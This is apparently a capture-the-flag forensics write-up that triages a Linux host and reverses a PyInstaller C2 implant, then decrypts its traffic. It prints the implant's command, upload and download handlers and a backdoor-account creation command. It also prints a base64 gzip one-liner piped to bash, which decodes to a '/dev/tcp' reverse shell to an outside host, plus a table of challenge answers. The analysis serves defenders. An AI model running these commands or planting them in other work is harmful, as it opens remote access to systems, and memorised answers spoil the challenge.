# The Ash-Binder Signature: Writeup

**Category:** Forensics / DFIR (Linux triage + network capture)
**Files provided:** `capture.pcap`, `uac-ash-wbsrv03-linux-20260522185435.tar.gz` (UAC triage collection)

## TL;DR

A UAC (Unix-like Artifacts Collector) triage image from host `ash-wbsrv03`
(10.10.0.10) is paired with a packet capture of the intrusion. A PyInstaller'd
Python implant, `linux_sys_updater`, was dropped on an internal share
(`/srv/AshShare`) and run interactively by the user `kingmaelor`. The implant
is a custom C2 client: it beacons out to `10.10.0.56:443`, authenticates with a
static challenge/response, and speaks a small text-based protocol
(`CMD`, `DWNL_FILE`/`DWNL_DATA`, `UPLD_FILE`/`UPLD_DATA`, `SHUTDOWN`) wrapped in
AES-CBC + SHA-256 HMAC framing. Because the AES/HMAC keys are derived from a
**hardcoded passphrase** baked into the binary, the entire C2 session in
`capture.pcap` can be decrypted offline: recovering the operator's recon
commands, an SSH-key persistence drop, and a second (cron/init-less) reverse
shell persistence mechanism.

---

## 1. Triaging the collection

```
tar xzf uac-ash-wbsrv03-linux-20260522185435.tar.gz
```

The UAC bundle includes `live_response/process/ps_*`, `live_response/storage/*`,
a bodyfile, and a full filesystem copy under `[root]/`. Two things stand out
immediately:

- `live_response/storage/findmnt.txt` shows an extra ext4 mount:
  ```
  /srv/AshShare   /dev/sda1[/home/usr/docker_files/containers/ca26/C2/client]
  ```: i.e. a bind-mounted directory named `AshShare`, seeded from a path that
  literally says `C2/client`. That alone is worth pulling on.

- `live_response/process/ps_-ef.txt` (and `ps_auxwwwf.txt`, `ps_-deaf.txt`,
  `ps_-axo_pid_user_lstart_args.txt`) all show:
  ```
  kingmae+   99   95  2 18:54 pts/1  00:00:00 /srv/AshShare/linux_sys_updater
  kingmae+  100   99  1 18:54 pts/1  00:00:00 /srv/AshShare/linux_sys_updater
  ```

So the binary was executed interactively from a pts (pseudo-tty) session, not
a service: consistent with an operator who already had shell access dropping
and running a tool by hand.

**Compromised user & primary group:** `/etc/passwd` gives
`kingmaelor:x:1005:1011::/home/kingmaelor:/bin/bash`; GID `1011` resolves in
`/etc/group` to `crownspire`.

```
kingmaelor:crownspire
```

**Malicious binary, full path:**

```
/srv/AshShare/linux_sys_updater
```

```bash
file uac_extract/\[root\]/srv/AshShare/linux_sys_updater
# ELF 64-bit LSB executable, x86-64 ... stripped
```

## 2. Cracking open the implant

`linux_sys_updater` is a stripped ELF, but strings reveal `PyRun_SimpleStringFlags`
and `pyi-python-flag`: a PyInstaller-frozen Python 3.12 binary. Extracting it:

```bash
pip install pyinstxtractor-ng
pyinstxtractor-ng linux_sys_updater
```

This unpacks a PYZ archive containing the entry point `client.pyc`. Standard
decompilers (uncompyle6/decompyle3) don't support 3.12 bytecode yet, so the
fastest path was disassembling directly with the stdlib and reading it back as
pseudo-code:

```python
import dis, marshal
data = open('client.pyc','rb').read()
code = marshal.loads(data[16:])   # skip the 16-byte pyc header
dis.dis(code)
```

The module and every function/variable name has been renamed to random
6-character tokens (`Fg3hY6`, `Jn2bM4`, `X7wR9t`, ...), but the *logic* is
plain once disassembled.

### 2.1 String obfuscation

Every user-facing protocol string is wrapped in a helper (renamed `Jn2bM4`):

```python
def Jn2bM4(s):
    if len(s) % 4:
        s += '=' * (4 - len(s) % 4)
    b = base64.b64decode(s)
    b = bytes(x ^ 0x55 for x in b)   # XOR 85
    b = bytes(x ^ 0xAA for x in b)   # XOR 170
    return b.decode('utf-8')
```

i.e. base64 → XOR 0x55 → XOR 0xAA (equivalent to a single XOR 0xFF, applied
twice for obfuscation's sake). Decoding every literal passed to it recovers
the full protocol vocabulary:

| Obfuscated constant | Decoded |
|---|---|
| `vqy3oLyztqA=` | `ASH_CLI_` (client-ID prefix) |
| `vbq+vLCx34TPgt+EzoI=` | `BEACON {0} {1}` |
| `vLe+s7O6sbi6` | `CHALLENGE` |
| `vLe+s7O6sbi6oK26rK+wsay6` | `CHALLENGE_RESPONSE` |
| `vLK73w==` | `CMD ` |
| `sKqrr6qr34TPgt+EzoI=` | `OUTPUT {0} {1}` |
| `u6ixs6C5trO63w==` | `DWNL_FILE ` |
| `u6ixs6C7vqu+34TPgg==` | `DWNL_DATA {0}` |
| `u6ixs6CxsKugubCqsbs=` | `DWNL_NOT_FOUND` |
| `qq+zu6C5trO63w==` | `UPLD_FILE ` |
| `qq+zu6C7vqu+3w==` | `UPLD_DATA ` |
| `qq+zu6C+vLQ=` | `UPLD_ACK` |
| `qq+zu6C5vraz` | `UPLD_FAIL` |
| `rLeqq7uwqLE=` | `SHUTDOWN` |
| `t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb` | `HMAC verification failed` |

**Client-ID prefix:** `ASH_CLI_`

### 2.2 Key derivation & framing

A hardcoded passphrase (`X7wR9t`) is fed into a KDF (renamed `Fg3hY6`):

```python
X7wR9t = 'ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j'

def Fg3hY6(passphrase):
    base   = hashlib.sha256(passphrase.encode()).digest()
    enc_key  = hashlib.sha256(base + b'encryption').digest()[:32]
    hmac_key = hashlib.sha256(base + b'hmac').digest()[:32]
    return enc_key, hmac_key

Pq2mN5, Zk8vL4 = Fg3hY6(X7wR9t)   # Pq2mN5 = AES key, Zk8vL4 = HMAC key
```

Every message is framed as `iv(16) || AES-128/256-CBC ciphertext || SHA256(hmac_key + iv + ciphertext)(32)`,
base64-encoded, and sent length-prefixed (`struct.pack('>I', len(msg))`) over
the raw TCP socket:

```python
def encrypt(plaintext):
    iv  = get_random_bytes(16)
    ct  = AES.new(Pq2mN5, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
    tag = hashlib.sha256(Zk8vL4 + iv + ct).digest()
    return base64.b64encode(iv + ct + tag)

def decrypt(blob):
    raw = base64.b64decode(blob)
    iv, ct, tag = raw[:16], raw[16:-32], raw[-32:]
    if hashlib.sha256(Zk8vL4 + iv + ct).digest() != tag:
        raise ValueError(Jn2bM4('t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb'))
    return unpad(AES.new(Pq2mN5, AES.MODE_CBC, iv).decrypt(ct), 16).decode()
```

Computing the actual key bytes:

```python
>>> Pq2mN5.hex()
'9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b'[:64]
>>> hashlib.md5(Pq2mN5).hexdigest()
'6ffc06ff97ec037753feda5354b650b3'
```

**AES key (MD5 of the raw 32-byte key):**

```
6ffc06ff97ec037753feda5354b650b3
```

### 2.3 Protocol dispatch loop

The client generates its ID (`ASH_CLI_` + 20 random lowercase letters), beacons,
completes a fixed challenge/response handshake, then loops on encrypted
commands from the server:

```python
if cmd.startswith('DWNL_FILE '):        # server requests a local file
    path = cmd.split(' ', 2)[1]
    if os.path.exists(path):
        send(f'DWNL_DATA {b64encode(open(path,"rb").read())}')
    else:
        send('DWNL_NOT_FOUND')

elif cmd.startswith('UPLD_FILE '):      # server pushes a file to write locally
    path = cmd.split(' ', 2)[1]
    data = recv()
    if data and data.startswith('UPLD_DATA '):
        write(path, b64decode(data[len('UPLD_DATA '):]))
        send('UPLD_ACK')
    else:
        send('UPLD_FAIL')

elif cmd.startswith('CMD '):            # remote command execution
    output = exec_cmd(cmd[4:].strip())  # subprocess.check_output(..., shell=True, timeout=10)
    send(f'OUTPUT {client_id} {output}')

elif cmd == 'SHUTDOWN':
    break
```

**Command that initiates a file upload (server → victim):** `UPLD_FILE`
(the victim answers with `UPLD_DATA`, then `UPLD_ACK`/`UPLD_FAIL`).

**Variable holding remote-command output:** in the exec helper,
`subprocess.check_output(...)` is assigned to the local variable `Kd3uD9`,
which is then `.decode()`'d and returned.

## 3. Decrypting the capture

`capture.pcap` contains two TCP conversations:

- `10.10.0.10:22 <-> 10.10.0.56:53470`: an SSH session (the operator logging
  back in once persistence was in place).
- `10.10.0.10:49892 <-> 10.10.0.56:443`: the custom C2 channel above.

Reassembling the `:443` stream per direction and peeling off the 4-byte
length-prefixed, base64/AES/HMAC-wrapped messages with the recovered key:

```python
enc_key, hmac_key = Fg3hY6('ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j')

def decrypt(blob):
    raw = base64.b64decode(blob)
    iv, ct, tag = raw[:16], raw[16:-32], raw[-32:]
    assert hashlib.sha256(hmac_key + iv + ct).digest() == tag
    return unpad(AES.new(enc_key, AES.MODE_CBC, iv).decrypt(ct), 16)
```

every single frame decrypts cleanly (HMAC verifies) into the operator's
session, in order:

```
C: BEACON ASH_CLI_nxpgkxxdatxrcbvkeqby 1779476072.64...
S: CHALLENGE
C: CHALLENGE_RESPONSE
S: DWNL_FILE /etc/ssh/sshd_config
C: DWNL_DATA <b64 of sshd_config>
S: DWNL_ACK
S: DWNL_FILE /etc/hosts
C: DWNL_DATA <b64 of /etc/hosts>
S: DWNL_ACK
S: UPLD_FILE /home/kingmaelor/.ssh/authorized_keys
C: UPLD_DATA <b64 ssh-ed25519 ... ash@team.htb>
C: UPLD_ACK
S: CMD uname -a
C: OUTPUT ... Linux ash-wbsrv03 6.12.88+deb13-amd64 ...
S: CMD ls -la /etc
C: OUTPUT ... (directory listing)
S: CMD id
C: OUTPUT ... uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)
S: CMD sudo -l
C: OUTPUT ... (ALL : ALL) ALL
S: CMD sudo useradd -m -s /bin/bash backup_usr && echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd
C: OUTPUT ...
S: CMD cat /etc/passwd | grep -i backup_usr
C: OUTPUT ... backup_usr:x:1016:1016::/home/backup_usr:/bin/bash
S: CMD env
C: OUTPUT ... SSH_CLIENT=10.10.0.56 53470 22 ... _PYI_ARCHIVE_FILE=/srv/AshShare/linux_sys_updater ...
S: CMD echo '<base64 gzip>' | base64 -d | gunzip | bash
C: OUTPUT ...
```

**Second downloaded file** (`DWNL_FILE`, victim → operator): after
`/etc/ssh/sshd_config`, the second one is `/etc/hosts`.

**Second executed command** (`CMD`, operator → victim): after `uname -a`, the
second is `ls -la /etc`.

## 4. Persistence

Two independent persistence mechanisms were planted during the session above.

### 4.1 SSH key drop

```
UPLD_FILE /home/kingmaelor/.ssh/authorized_keys
UPLD_DATA c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSU5UNkFITEZKT2h0R2t2NVllRjJ4Z3A1R0NkREJBeVdDSUJTeHBOVEtnNDAgYXNoQHRlYW0uaHRi
```

Base64-decoding the payload gives:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINT6AHLFJOhtGkv5YeF2xgp5GCdDBAyWCIBSxpNTKg40 ash@team.htb
```: an ed25519 public key (comment `ash@team.htb`) appended to `kingmaelor`'s
`authorized_keys`. This matches the second TCP conversation in the capture:
the operator later authenticates over `10.10.0.10:22` directly with this key
(`env` output on the victim shows `SSH_CLIENT=10.10.0.56 53470 22`).

### 4.2 Reverse-shell dropper

The final `CMD` in the session runs a gzip+base64-packed one-liner:

```bash
echo 'H4sIABLFDWoA/5XNQQ7CIBBG4av8K7owMJ20uuQuCBOHFKSBxujtGy9g4gG+9+qWcofdQdqq0JafjxqktE6utBgKDQ1dYAwkasN0D0NhM7wBJXnREXfilR3P7G6rW+i6YPaGJ/jfSXLjMw6pyaqUXfp3EbW2hMv7P3kCreFnE8MAAAA=' | base64 -d | gunzip | bash
```

Decoding it:

```python
>>> gzip.decompress(base64.b64decode(payload)).decode()
mkdir -p /home/kingmaelor/.local/share && \
echo 'bash -i >& /dev/tcp/141.101.64.3/53 0>&1' > /home/kingmaelor/.local/share/.systemd-helper && \
chmod +x /home/kingmaelor/.local/share/.systemd-helper
```

**New user created for persistence:**

```
backup_usr:9cq3jPVN6Me1
```

**Persistence file written (full path):**

```
/home/kingmaelor/.local/share/.systemd-helper
```

**Reverse shell invocation inside that file, remote endpoint:**

```
141.101.64.3:53
```

(The file is named to blend in with systemd but isn't wired into any
unit/cron on its own in this capture: it's a dropped payload, one execution
or an accompanying scheduler entry away from re-establishing the shell.)

## 5. Answer summary

| Question | Answer |
|---|---|
| Compromised user (user:primary_group) | `kingmaelor:crownspire` |
| Malicious binary, full path | `/srv/AshShare/linux_sys_updater` |
| AES key used for C2 traffic (MD5 of key bytes) | `6ffc06ff97ec037753feda5354b650b3` |
| Client-ID prefix | `ASH_CLI_` |
| Command that initiates file upload | `UPLD_FILE` |
| Variable storing command-execution output | `Kd3uD9` |
| Second executed command in the C2 session | `ls -la /etc` |
| Second file downloaded (exfiltrated) via `DWNL_FILE` | `/etc/hosts` |
| New persistence user credentials | `backup_usr:9cq3jPVN6Me1` |
| Persistence file (full path) | `/home/kingmaelor/.local/share/.systemd-helper` |
| Reverse shell IP:port in that file | `141.101.64.3:53` |

## Root cause summary

| | |
|---|---|
| **Initial foothold** | Operator already had (or obtained) an interactive shell as `kingmaelor` on `ash-wbsrv03`; no exploitation is visible in this capture, only post-access tooling. |
| **Delivery** | A PyInstaller-packed Python C2 client (`linux_sys_updater`) was staged on `/srv/AshShare`, a share whose underlying bind-mount path (`.../docker_files/containers/ca26/C2/client`) betrays its true purpose. |
| **C2 design flaw** | AES/HMAC keys are derived from a passphrase hardcoded in the binary itself, and every protocol string is only lightly obfuscated (base64 + XOR). Anyone who extracts the binary can derive the keys and passively decrypt the *entire* C2 session from a packet capture: no MITM or key exfiltration required. |
| **Actions on objective** | Recon (`uname`, `id`, `sudo -l`, `env`), config/host-file exfil (`DWNL_FILE`), and two persistence mechanisms: an SSH authorized_keys drop and a `/dev/tcp` reverse-shell script plus a new local backdoor account (`backup_usr`). |
| **Fix / detection** | Treat any PyInstaller ELF served from a writable share as suspicious; alert on `authorized_keys` modification, `useradd`/`chpasswd` outside change control, and outbound connections to non-standard 443 endpoints that don't complete a TLS handshake. Because the implant's crypto keys are static per-sample, extracting and reversing any single copy of the binary is sufficient to retroactively decrypt all captured traffic for that campaign. |
